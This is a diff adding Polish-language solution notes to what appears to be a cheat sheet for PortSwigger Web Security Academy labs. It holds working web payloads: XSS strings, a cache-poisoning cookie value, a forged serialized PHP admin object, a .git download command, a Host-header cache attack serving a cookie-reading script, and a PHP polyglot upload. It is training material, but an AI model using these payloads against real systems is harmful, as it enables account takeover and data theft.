@@ -152,16 +152,50 @@ X-Original-URL: /admin/delete
 ### Brute-forcing a stay-logged-in cookie
 
 ## WebSockets
+### Manipulating the WebSocket handshake to exploit vulnerabilities
+1. Wiadomość o treści:
+```html
+<img src=1 oNeRrOr=alert`1`>
+```
 
 ## Web cache poisoning
-
+### Web cache poisoning with an unkeyed cookie
+1. Podmienić cookie na poniższą wartość, aż request się zcachuje
+```
+fehost=someString"-alert(1)-"someString
+```
 ## Insecure deserialization
-
+### 
+1. Podmieniamy obiekt na:
+```
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
+2. zmieniamy ścieżkę na 
+```
+/admin/delete?username=carlos
+```
 ## Information disclosure
+### Information disclosure in version control history
+1. Pobieramy `.git`
+```bash
+wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
+```
+2. Lokalnie znajdujemy hasło do admina
 
 ## Business logic vulnerabilities
+### Weak isolation on dual-use endpoint
+1. Podczas zmiany hasła usuwamy parametr `current-password` i podniemiany `username` na administrator.
 
 ## HTTP Host header attacks
+### Web cache poisoning via ambiguous requests
+1. W exploit serverze tworzymy sciezke pod adresem `/resources/js/tracking.js`
+```js
+alert(document.cookie)
+```
+2. Do zapytania dodajemy dodatkowy HOSt header
+```
+Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+```
 
 ## OAuth authentication
 ### Forced OAuth profile linking
@@ -172,8 +206,12 @@ X-Original-URL: /admin/delete
 2. Sprawdzamy czy konta są połączone
 
 ## File upload vulnerabilities
+### 
+1. Uploadujemy ployglot.php
+2. Wchodzimy na stronę `/files/avatars/polyglot.php` i mamy sekres carlosa
 
 ## JWT
+### JWT authentication bypass via weak signing key
 
 ## Essential skills
 ### Discovering vulnerabilities quickly with targeted scanning
@@ -183,3 +221,6 @@ Podnieniamy productId na:
 ```
 
 ## Prototype pollution
+### DOM XSS via client-side prototype pollution
+
+Używamy DOM Invader
